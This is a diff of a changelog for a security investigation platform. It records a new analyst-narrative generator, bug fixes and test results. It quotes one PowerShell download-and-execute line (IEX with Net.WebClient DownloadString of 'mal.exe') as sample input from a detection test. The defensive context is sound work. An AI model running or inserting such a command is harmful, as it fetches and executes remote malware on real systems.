@@ -1,5 +1,45 @@
 # NivXRay — Enterprise Attack Investigation Platform
 
+## 2026-08-01 · **MDR-Analyst-Style Executive Investigation Summary · SHIPPED**
+
+Operator asked for an analyst-voice, evidence-driven, variable-length narrative — not a numbered 14-section report.
+
+### Built
+- `/app/backend/nivxforge/investigation/analyst_narrative.py` · `compose_analyst_narrative(cio)` produces the MDR narrative:
+  - **9 adaptive sections**: Detection & Alert · Executable & Command · File Hashes · Containment · Execution Chain · Threat Intelligence · Multi-Host Exposure · MITRE ATT&CK · Verdict & Investigative Guidance.
+  - Each section emits ONLY if the CIO carries the evidence — no template phrases, no filler.
+  - Grouped into 2–4 paragraphs by MDR reading order. Guaranteed ≥ 2 paragraphs on any non-empty CIO.
+  - Deterministic. No LLM.
+- `Summary.analyst_narrative` field added (`summary_composer.py`).
+- Projector exposes `view.analystNarrative` (`labv2.projector.js`).
+- `ExecutiveDashboard.jsx` renders `AnalystNarrativeCard` as the LEAD card above the Verdict Card.
+
+### Live verification (encoded PS + IEX + private IP)
+- 3 paragraphs rendered on the Executive lens with real data:
+  - **P1**: "The primary executable powershell was invoked with the command `IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/mal.exe')`. The payload required 3 decoder passes to reach its final form, indicating deliberate obfuscation."
+  - **P2**: MITRE tactic IDs + technique IDs with names.
+  - **P3**: Verdict rationale (raw 100% → mitigator dampens → 57% final) + escalation rule cite + 3 concrete next-steps.
+- Verdict card / quality gate / IOCs / MITRE / LOLBAS / audit still rendered below.
+
+### Extra fixes in this session
+- Fixed a critical `/decode/smart` regression from the earlier RADE augmentation — RADE was augmenting plain-text single commands and triggering the multi-fragment path (returning no CIO). RADE now runs only on structured inputs (XML/JSON), not plain text.
+- `_sanitize_customer_text` was collapsing ALL whitespace including `\n\n`, destroying paragraph breaks in the narrative. Narrative composer now sanitises per-paragraph then rejoins with `\n\n`.
+- `_mitre_techniques()` / `_mitre_tactic_ids()` in narrative composer handle BOTH mitre_digest shapes (flat `{techniques, tactics, coverage}` and tactic-keyed).
+
+### Regression
+- 281/283 pytest passing (same 2 pre-existing failures).
+
+### Still frozen per operator directive
+Phase 4 · Golden Corpus expansion beyond 7 verified cases · Learning · Explainability · Persona · LLM polish · new UI.
+
+### Bugs still open from the previous readiness report
+- BUG-P4-01 · WMI over-escalation — architectural fix wired (`wmi_discovery` LOW kind + `_input_text_is_wmi_discovery` post-pass). Needs re-run of the validation matrix to confirm.
+- BUG-P4-02 · Auto-investigate MITRE parity — not yet fixed.
+- BUG-P4-03 · Recursive Artifact Discovery Engine — implemented for JSON + XML. Needs re-run of the validation matrix.
+
+---
+
+
 ## 2026-08-01 · **Release Readiness Report · Deployment BLOCKED**
 
 Operator directive executed in strict order — NO Phase 4, NO Learning, NO Explainability, NO Persona, NO LLM polish, NO new UI. Freeze holds.
